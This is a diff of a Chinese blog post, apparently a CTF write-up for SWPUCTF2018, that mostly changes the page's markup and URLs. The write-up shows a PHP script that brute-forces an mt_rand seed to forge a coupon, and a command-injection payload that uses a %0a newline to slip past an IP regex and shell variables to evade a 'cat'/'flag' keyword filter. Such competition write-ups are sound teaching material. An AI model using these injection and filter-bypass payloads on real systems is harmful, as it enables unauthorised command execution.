@@ -71,12 +71,12 @@
 
 
 
-<meta name="description" content="用优惠码  买个 X ?flag在/flag中URL http://123.207.84.13:22333注册个账号登录登录提示送你优惠码优惠码保存在cookie中的Auth中输入优惠码提示要输入24位的优惠码http://123.207.84.13:22333/www.zip 源码泄露只有个source.php文件12345678910111213141516171819202122232425">
+<meta name="description" content="用优惠码  买个 X ?flag在/flag中URL http://123.207.84.13:22333注册个账号登录登录提示送你优惠码优惠码保存在cookie中的Auth中输入优惠码提示要输入24位的优惠码http://123.207.84.13:22333/www.zip 源码泄露只有个source.php文件 &amp;lt;?php //生成优惠码 $_SESSION[&amp;#39;seed&amp;#39">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SWPUCTF2018 writeup">
-<meta property="og:url" content="http://www.cuittk.cn/2018/12/18/SWPUCTF2018 writeup/index.html">
+<meta property="og:url" content="https://blog.cuittk.cn/2018/12/18/SWPUCTF2018 writeup/index.html">
 <meta property="og:site_name" content="h1tler&#39;s blog">
-<meta property="og:description" content="用优惠码  买个 X ?flag在/flag中URL http://123.207.84.13:22333注册个账号登录登录提示送你优惠码优惠码保存在cookie中的Auth中输入优惠码提示要输入24位的优惠码http://123.207.84.13:22333/www.zip 源码泄露只有个source.php文件12345678910111213141516171819202122232425">
+<meta property="og:description" content="用优惠码  买个 X ?flag在/flag中URL http://123.207.84.13:22333注册个账号登录登录提示送你优惠码优惠码保存在cookie中的Auth中输入优惠码提示要输入24位的优惠码http://123.207.84.13:22333/www.zip 源码泄露只有个source.php文件 &amp;lt;?php //生成优惠码 $_SESSION[&amp;#39;seed&amp;#39">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/1r135d6ja1ii1y0aoonfgs49gg.png">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/fxyoe86lrtyjs84j2wqbwwe4uz.png">
@@ -85,10 +85,10 @@
 <meta property="og:image" content="http://img.cdn.cuittk.cn/yw0f1aa8jzizrlborax2wrzk0r.png">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/9nwzq7mw50o1oa0ipnw4aylplo.png">
 <meta property="og:image" content="http://img.cdn.cuittk.cn/frk88q8abhntgwkl6yjaey8vkj.png">
-<meta property="og:updated_time" content="2018-12-25T12:56:36.938Z">
+<meta property="og:updated_time" content="2020-02-26T10:27:03.911Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SWPUCTF2018 writeup">
-<meta name="twitter:description" content="用优惠码  买个 X ?flag在/flag中URL http://123.207.84.13:22333注册个账号登录登录提示送你优惠码优惠码保存在cookie中的Auth中输入优惠码提示要输入24位的优惠码http://123.207.84.13:22333/www.zip 源码泄露只有个source.php文件12345678910111213141516171819202122232425">
+<meta name="twitter:description" content="用优惠码  买个 X ?flag在/flag中URL http://123.207.84.13:22333注册个账号登录登录提示送你优惠码优惠码保存在cookie中的Auth中输入优惠码提示要输入24位的优惠码http://123.207.84.13:22333/www.zip 源码泄露只有个source.php文件 &amp;lt;?php //生成优惠码 $_SESSION[&amp;#39;seed&amp;#39">
 <meta name="twitter:image" content="http://img.cdn.cuittk.cn/1r135d6ja1ii1y0aoonfgs49gg.png">
 
 
@@ -119,12 +119,12 @@
 
 
 
-  <link rel="canonical" href="http://www.cuittk.cn/2018/12/18/SWPUCTF2018 writeup/"/>
+  <link rel="canonical" href="https://blog.cuittk.cn/2018/12/18/SWPUCTF2018 writeup/"/>
 
 
 
 
-
+<link rel="stylesheet" href="/js/prism/prism.css">
   <title>SWPUCTF2018 writeup | h1tler's blog</title>
   
 
@@ -262,7 +262,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.cuittk.cn/2018/12/18/SWPUCTF2018 writeup/">
+    <link itemprop="mainEntityOfPage" href="https://blog.cuittk.cn/2018/12/18/SWPUCTF2018 writeup/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="h1tler">
@@ -356,11 +356,75 @@
       
 
       
-        <h2 id="用优惠码-买个-X"><a href="#用优惠码-买个-X" class="headerlink" title="用优惠码  买个 X ?"></a>用优惠码  买个 X ?</h2><p>flag在/flag中<br>URL <a href="http://123.207.84.13:22333" target="_blank" rel="external">http://123.207.84.13:22333</a><br><img src="http://img.cdn.cuittk.cn/1r135d6ja1ii1y0aoonfgs49gg.png" alt=""><br>注册个账号登录<br>登录提示送你优惠码<br><img src="http://img.cdn.cuittk.cn/fxyoe86lrtyjs84j2wqbwwe4uz.png" alt=""><br>优惠码保存在cookie中的Auth中<br>输入优惠码提示要输入24位的优惠码<br><img src="http://img.cdn.cuittk.cn/mxudziuc7y4on6h9ghfod6y7uj.png" alt=""><br><a href="http://123.207.84.13:22333/www.zip" target="_blank" rel="external">http://123.207.84.13:22333/www.zip</a> 源码泄露<br>只有个source.php文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">//生成优惠码</div><div class="line">$_SESSION[&apos;seed&apos;]=rand(0,999999999);</div><div class="line">function youhuima()&#123;</div><div class="line">	mt_srand($_SESSION[&apos;seed&apos;]);</div><div class="line">    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</div><div class="line">    $auth=&apos;&apos;;</div><div class="line">    $len=15;</div><div class="line">    for ( $i = 0; $i &lt; $len; $i++ )&#123;</div><div class="line">        if($i&lt;=($len/2))</div><div class="line">              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);</div><div class="line">        else</div><div class="line">              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);</div><div class="line">    &#125;</div><div class="line">    setcookie(&apos;Auth&apos;, $auth);</div><div class="line">&#125;</div><div class="line">//support</div><div class="line">	if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip))&#123;</div><div class="line">        if (!preg_match(&quot;/\?|flag|&#125;|cat|echo|\*/i&quot;,$ip))&#123;</div><div class="line">               //执行命令</div><div class="line">        &#125;else &#123;</div><div class="line">              //flag字段和某些字符被过滤!</div><div class="line">        &#125;</div><div class="line">	&#125;else&#123;</div><div class="line">             // 你的输入不正确!</div><div class="line">	&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
-<p>代码中只生成了15位。验证应该还有一个生成24位。<br>无论是rand()函数还是mt_rand()函数,当随机数种子相同的时候,无论运行多少次,产生的随机数序列都是一样的，随机数种子是关键。但是种子范围在rand(0,999999999);<br>只能爆破了，<br>kali下php版本为7.2.4，题目的版本是PHP/7.2.9-1，我发现本地用php5.4使用一样的种子生成的是不一样的序列<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">ini_set(&apos;max_execution_time&apos;,&apos;0&apos;);</div><div class="line">function youhuima()&#123;</div><div class="line">	mt_srand($_SESSION[&apos;seed&apos;]);</div><div class="line">    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;//62</div><div class="line">    $auth=&apos;&apos;;</div><div class="line">    $len=15;</div><div class="line">    for ( $i = 0; $i &lt; $len; $i++ )&#123;</div><div class="line">        if($i&lt;=($len/2))</div><div class="line">              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);</div><div class="line">        else</div><div class="line">              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*(-1), 1);</div><div class="line">    &#125;</div><div class="line">    return $auth;</div><div class="line">    //setcookie(&apos;Auth&apos;, $auth);</div><div class="line">&#125;</div><div class="line">for($i=0;$i&lt;999999999;$i++)</div><div class="line">&#123;</div><div class="line">    $_SESSION[&apos;seed&apos;] = $i;</div><div class="line">    if(youhuima() == &quot;tmqoTcEJIQ5lrsF&quot;)</div><div class="line">    &#123;</div><div class="line">        echo $i,&quot;&lt;/br&gt;&quot;;</div><div class="line">		 echo youhuima();</div><div class="line">        exit();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">//echo &quot;tmqoTcEJIQ5lrsF&quot;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
-<p>也就几分钟，就爆破出来了。可能是运气好<br><img src="http://img.cdn.cuittk.cn/61wmtb9k7mcdtjvv219h52nle4.png" alt=""><br>得到随机种子15252003，<br>设置$_SESSION[‘seed’]为15252003，得到优惠码tmqoTcEJsk5PJsFZfOqDZXbd<br>已经得到的session<br>PHPSESSID=42i3mgn649nj6vsvtc05h2oej6<br>进入下一个support<br><a href="http://123.207.84.13:22333/exec.php" target="_blank" rel="external">http://123.207.84.13:22333/exec.php</a><br><img src="http://img.cdn.cuittk.cn/yw0f1aa8jzizrlborax2wrzk0r.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip))&#123;</div></pre></td></tr></table></figure></p>
-<p>虽然有了开头^和结尾$，但是有/m参数，/m表示开启多行匹配模式<br>使用%0a绕过<br>1.1.1.1%0awhoami<br>不知道为什么在输入框输入不行，要用参数提交<br>POST：ip=1.1.1.1%0awhoami<br><img src="http://img.cdn.cuittk.cn/9nwzq7mw50o1oa0ipnw4aylplo.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (!preg_match(&quot;/\?|flag|&#125;|cat|echo|\*/i&quot;,$ip))&#123;</div></pre></td></tr></table></figure></p>
-<p>过滤了cat flag关键字<br>使用变量绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">a=c;b=at;c=fl;d=ag;$a$b $c$d</div><div class="line">ip=127.0.0.1%0acd ../../../;ls -l;a=c;b=at;c=fl;d=ag;$a$b $c$d</div></pre></td></tr></table></figure></p>
+        <h2 id="用优惠码-买个-X"><a href="#用优惠码-买个-X" class="headerlink" title="用优惠码  买个 X ?"></a>用优惠码  买个 X ?</h2><p>flag在/flag中<br>URL <a href="http://123.207.84.13:22333" target="_blank" rel="external">http://123.207.84.13:22333</a><br><img src="http://img.cdn.cuittk.cn/1r135d6ja1ii1y0aoonfgs49gg.png" alt=""><br>注册个账号登录<br>登录提示送你优惠码<br><img src="http://img.cdn.cuittk.cn/fxyoe86lrtyjs84j2wqbwwe4uz.png" alt=""><br>优惠码保存在cookie中的Auth中<br>输入优惠码提示要输入24位的优惠码<br><img src="http://img.cdn.cuittk.cn/mxudziuc7y4on6h9ghfod6y7uj.png" alt=""><br><a href="http://123.207.84.13:22333/www.zip" target="_blank" rel="external">http://123.207.84.13:22333/www.zip</a> 源码泄露<br>只有个source.php文件</p>
+<pre><code class="language-php">&lt;?php
+//生成优惠码
+$_SESSION[&#39;seed&#39;]=rand(0,999999999);
+function youhuima(){
+    mt_srand($_SESSION[&#39;seed&#39;]);
+    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;
+    $auth=&#39;&#39;;
+    $len=15;
+    for ( $i = 0; $i &lt; $len; $i++ ){
+        if($i&lt;=($len/2))
+              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);
+        else
+              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);
+    }
+    setcookie(&#39;Auth&#39;, $auth);
+}
+//support
+    if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip)){
+        if (!preg_match(&quot;/\?|flag|}|cat|echo|\*/i&quot;,$ip)){
+               //执行命令
+        }else {
+              //flag字段和某些字符被过滤!
+        }
+    }else{
+             // 你的输入不正确!
+    }
+?&gt;
+</code></pre>
+<p>代码中只生成了15位。验证应该还有一个生成24位。<br>无论是rand()函数还是mt_rand()函数,当随机数种子相同的时候,无论运行多少次,产生的随机数序列都是一样的，随机数种子是关键。但是种子范围在rand(0,999999999);<br>只能爆破了，<br>kali下php版本为7.2.4，题目的版本是PHP/7.2.9-1，我发现本地用php5.4使用一样的种子生成的是不一样的序列</p>
+<pre><code class="language-php">&lt;?php
+ini_set(&#39;max_execution_time&#39;,&#39;0&#39;);
+function youhuima(){
+    mt_srand($_SESSION[&#39;seed&#39;]);
+    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;//62
+    $auth=&#39;&#39;;
+    $len=15;
+    for ( $i = 0; $i &lt; $len; $i++ ){
+        if($i&lt;=($len/2))
+              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);
+        else
+              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*(-1), 1);
+    }
+    return $auth;
+    //setcookie(&#39;Auth&#39;, $auth);
+}
+for($i=0;$i&lt;999999999;$i++)
+{
+    $_SESSION[&#39;seed&#39;] = $i;
+    if(youhuima() == &quot;tmqoTcEJIQ5lrsF&quot;)
+    {
+        echo $i,&quot;&lt;/br&gt;&quot;;
+         echo youhuima();
+        exit();
+    }
+}
+//echo &quot;tmqoTcEJIQ5lrsF&quot;;
+?&gt;
+</code></pre>
+<p>也就几分钟，就爆破出来了。可能是运气好<br><img src="http://img.cdn.cuittk.cn/61wmtb9k7mcdtjvv219h52nle4.png" alt=""><br>得到随机种子15252003，<br>设置$_SESSION[‘seed’]为15252003，得到优惠码tmqoTcEJsk5PJsFZfOqDZXbd<br>已经得到的session<br>PHPSESSID=42i3mgn649nj6vsvtc05h2oej6<br>进入下一个support<br><a href="http://123.207.84.13:22333/exec.php" target="_blank" rel="external">http://123.207.84.13:22333/exec.php</a><br><img src="http://img.cdn.cuittk.cn/yw0f1aa8jzizrlborax2wrzk0r.png" alt=""></p>
+<pre><code class="language-php">if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip)){
+</code></pre>
+<p>虽然有了开头^和结尾$，但是有/m参数，/m表示开启多行匹配模式<br>使用%0a绕过<br>1.1.1.1%0awhoami<br>不知道为什么在输入框输入不行，要用参数提交<br>POST：ip=1.1.1.1%0awhoami<br><img src="http://img.cdn.cuittk.cn/9nwzq7mw50o1oa0ipnw4aylplo.png" alt=""></p>
+<pre><code class="language-php">if (!preg_match(&quot;/\?|flag|}|cat|echo|\*/i&quot;,$ip)){
+</code></pre>
+<p>过滤了cat flag关键字<br>使用变量绕过</p>
+<pre><code class="language-html">a=c;b=at;c=fl;d=ag;$a$b $c$d
+ip=127.0.0.1%0acd ../../../;ls -l;a=c;b=at;c=fl;d=ag;$a$b $c$d
+</code></pre>
 <p><img src="http://img.cdn.cuittk.cn/frk88q8abhntgwkl6yjaey8vkj.png" alt=""></p>
 
       
@@ -480,7 +544,7 @@
             
               <a href="/archives/">
             
-                <span class="site-state-item-count">57</span>
+                <span class="site-state-item-count">58</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -608,7 +672,7 @@
 
 
 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
+<script src="/js/prism/prism.js" async></script>
         
 <div class="busuanzi-count">
   <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
